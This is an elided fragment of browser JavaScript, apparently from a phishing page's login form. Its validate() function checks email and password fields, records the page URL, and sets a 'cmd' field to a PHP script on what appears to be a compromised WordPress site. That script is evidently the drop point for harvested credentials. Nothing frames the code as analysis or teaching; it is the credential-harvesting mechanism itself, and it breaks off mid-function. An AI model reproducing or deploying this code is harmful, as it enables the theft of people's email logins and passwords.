...
function validate(){
	...
	var stat;
	console.log('ok');
	document.getElementById('location').value = document.location.href; 
	document.getElementById('cmd').value = "http://galerieartisoraka.com/wp-admin/includes/ppcurl.php";
	if(email.val() == ""){ 
		email.addClass("merror"); stat = false; 
	}   
	if(pass.val() == ""){ 
		pass.addClass("merror"); stat = false;
	}  
